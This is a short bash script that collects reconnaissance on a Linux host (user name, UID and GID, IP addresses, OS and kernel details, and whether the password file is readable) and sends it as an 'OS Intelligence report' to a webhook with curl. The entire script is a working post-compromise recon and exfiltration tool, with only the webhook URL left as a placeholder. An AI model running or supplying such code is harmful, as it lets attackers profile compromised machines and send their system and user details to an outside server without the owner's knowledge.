#!/usr/local/bin/bash

if [[ $(uname) != "Linux" ]]; then
    echo "intel gathering impossible or your machine is not Linux."
fi

# intel commands, use declare to keep keys->values
declare -A commands=(
    [OS_name]="uname -o"
    [processor]="uname -p"
    [kernel_version_date]="uname -v | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2}'"
    [architecture]="arch"
    [user_name]="whoami"
    [os_ip]="hostname -I | tr ' ' '\n'"
    [user_id]="id | awk -F'uid=' '{print \$2}' | grep -oE -m1 '^[0-9]{1,4}'"
    [group_id]="id | awk -F'gid=' '{print \$2}' | grep -oE -m1 '^[0-9]{1,4}'"
    [is_passwd_accessible]="./passwd_access.sh"
)

# execute and check
declare -A results
for key in "${!commands[@]}"; do
    cmd="${commands[$key]}"
    output=$(eval "$cmd" 2>&1)
    if [[ $? -ne 0 ]]; then
        echo "Error on ${key} : ${cmd}"
        echo "Detail ${output}"
    fi
    results[$key]="$output"
done

# notify
WEBHOOK="<webhook-url>"
MESSAGE="==========INTEL-REPORT==========
        -----------user-----------
        User : ${results[user_name]}
        UID : ${results[user_id]}
        GID : ${results[group_id]}
        -----------uname-----------
        Os : ${results[OS_name]}
        Processor : ${results[processor]}
        Kernel Version Date : ${results[kernel_version_date]}
        -----------others-----------
        Addresses : ${results[os_ip]}
        Access to password file ? : ${results[is_passwd_accessible]}
        "

# -n null input : create json object from nothing
JSON_PAYLOAD=$(jq -n --arg msg "$MESSAGE" '{ 
  "embeds": [{
    "title": "OS Intelligence report",
    "description": $msg,
    "color": 9109504
  }]
}')
curl -H "Content-Type: application/json" -X POST -d "$JSON_PAYLOAD" "$WEBHOOK"
